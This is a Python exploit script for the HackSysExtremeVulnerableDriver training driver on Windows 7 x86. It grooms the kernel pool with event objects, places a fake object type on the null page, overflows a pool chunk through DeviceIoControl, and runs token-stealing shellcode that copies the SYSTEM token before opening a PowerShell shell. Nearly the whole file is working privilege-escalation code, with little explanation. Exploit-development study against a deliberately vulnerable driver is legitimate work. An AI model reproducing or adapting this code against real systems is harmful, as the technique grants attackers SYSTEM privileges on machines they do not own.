#!/usr/bin/python
#
# HEVD v1.20 PoolOverflow exploit for Windows 7 SP1 x86 by @acru3l.
#

import sys
import struct
from ctypes import *

device_name = r'\\.\HackSysExtremeVulnerableDriver'

# assembled with WinDBG
shellcode = ''
shellcode += '\x60'                             # pushad
shellcode += '\x31\xc0'                         # xor     eax,eax
shellcode += '\x64\x8b\x80\x24\x01\x00\x00'     # mov     eax,dword ptr fs:[eax+124h] ; 0x124 = offset nt!_KPCR.PcrbData.CurrentThread
shellcode += '\x8b\x40\x50'                     # mov     eax,dword ptr [eax+50h]     ; 0x50 = offset nt!_KTHREAD.ApcState.Process
shellcode += '\x8b\xc8'                         # mov     ecx,eax
shellcode += '\xba\x04\x00\x00\x00'             # mov     edx,4
shellcode += '\x8b\x80\xb8\x00\x00\x00'         # mov     eax,dword ptr [eax+0B8h]    ; 0xB8 = offset nt!_EPROCESS.ActiveProcessLinks.Flink
shellcode += '\x2d\xb8\x00\x00\x00'             # sub     eax,0B8h
shellcode += '\x39\x90\xb4\x00\x00\x00'         # cmp     dword ptr [eax+0B4h],edx    ; 0xB4 = offset nt!_EPROCESS.UniqueProcessId
shellcode += '\x75\xed'                         # jne     $-17
shellcode += '\x8b\x90\xf8\x00\x00\x00'         # mov     edx,dword ptr [eax+0F8h]    ; 0xF8 = offset nt!_EPROCESS.Token
shellcode += '\x89\x91\xf8\x00\x00\x00'         # mov     dword ptr [ecx+0F8h],edx
shellcode += '\x61'                             # popad
shellcode += '\xc2\x10\x00'                     # ret     10h                         ; TypeInfo.OkayToCloseProcedure takes 4 arguments

hFile = windll.kernel32.CreateFileA(device_name,
                                0xC0000000,     # GENERIC_READ | GENERIC_WRITE
                                0x00000001,     # FILE_SHARE_READ
                                0,              # NULL
                                3,              # OPEN_EXISTING
                                0x80,           # FILE_ATTRIBUTE_NORMAL
                                0)              # NULL

if hFile == -1:
    print '[-] Failed to open device: %s' % device_name
    sys.exit(1)
print '[+] Device opened successfully: %s' % device_name

# Mastr Plan:
# Grooming -> Alloc Null Page -> Pool Overflow -> Free Chunks -> pwn! ;)

# 1. groom Kernel Pool
print '[+] Allocationg 0x20000 objects'

handles = []
for i in xrange(0x20000):
    hObj = windll.kernel32.CreateEventA(0,
                                    0,
                                    0,
                                    0)          # with a name, size of an Event object changes
    if hObj == 0:
        print '[!] Failed to create %d th object' % i
    
    handles.append(hObj)

print '[+] Creating 0x%x holes' % (0x10000 / 16)

for i in xrange(0x10000, 0x20000, 16):
    # 0x40 * 8 == 0x200
    for h in handles[i:i+8]:
        windll.kernel32.CloseHandle(h)

# 2. allocate null page
print '[+] Placing fake obj at 0x0'

obj_size = 0x88
# fake nt!_OBJECT_TYPE
fake_obj = '\x00' * 0x74
fake_obj += struct.pack('<L', obj_size)         # TypeInfo.OkayToCloseProcedure
fake_obj += '\x00' * 0x10

hProcess = windll.kernel32.GetCurrentProcess()
base_addr = c_int(1)
buff_size = c_int(obj_size + len(shellcode))
status = windll.ntdll.NtAllocateVirtualMemory(hProcess,
                                byref(base_addr),
                                0,
                                byref(buff_size),
                                0x00003000,     # MEM_COMMIT | MEM_RESERVE
                                0x40)           # PAGE_EXECUTE_READWRITE

if status != 0 or base_addr.value != 0:
    print '[-] Failed to allocate null page'
    sys.exit(1)
print '[+] Null page allocated'

memmove(0, fake_obj + shellcode, obj_size + len(shellcode))

# 3. trigger pool oveflow
print '[+] Triggering Pool Overflow'

# nt!_POOL_HEADER:
#   +0x000 PreviousSize     : 0y001000000 (0x40)
#   +0x000 PoolIndex        : 0y0000000 (0)
#   +0x002 BlockSize        : 0y000001000 (0x8)
#   +0x002 PoolType         : 0y0000010 (0x2)
#   +0x000 Ulong1           : 0x4080040
#   +0x004 PoolTag          : 0xee657645
#   +0x004 AllocatorBackTraceIndex : 0x7645
#   +0x006 PoolTagHash      : 0xee65
pool_hdr = '\x40\x00\x08\x04' + \
           '\x45\x76\x65\xee'

# nt!_OBJECT_HEADER_QUOTA_INFO:
#   +0x000 PagedPoolCharge  : 0
#   +0x004 NonPagedPoolCharge : 0x40
#   +0x008 SecurityDescriptorCharge : 0
#   +0x00c SecurityDescriptorQuotaBlock : (null)
quota_info = '\x00\x00\x00\x00' + \
             '\x40\x00\x00\x00' + \
             '\x00\x00\x00\x00' + \
             '\x00\x00\x00\x00'

# nt!_OBJECT_HEADER:
#   +0x000 PointerCount     : 0n1
#   +0x004 HandleCount      : 0n1
#   +0x004 NextToFree       : 0x00000001 Void
#   +0x008 Lock             : _EX_PUSH_LOCK
#   +0x00c TypeIndex        : 0xc ''
#   +0x00d TraceFlags       : 0 ''
#   +0x00e InfoMask         : 0x8 ''
#   +0x00f Flags            : 0 ''
#   ...snip...
obj_hdr = '\x01\x00\x00\x00' + \
          '\x01\x00\x00\x00' + \
          '\x00\x00\x00\x00' + \
          '\x00\x00\x08\x00'                # TypeIndex: 0x0c -> 0x00

payload = 'A' * 0x1F8 + pool_hdr + quota_info + obj_hdr

ioctl_code = 0x22200F   # call PoolOverflowIoctlHandler
windll.kernel32.DeviceIoControl(hFile,
                                ioctl_code,
                                payload,
                                len(payload),
                                0,
                                0,
                                byref(c_int(0)),
                                0)

# 4. free all chunks
for h in handles:
    windll.kernel32.CloseHandle(h)

# Got SYSTEM shell?
import os
os.system("powershell.exe")
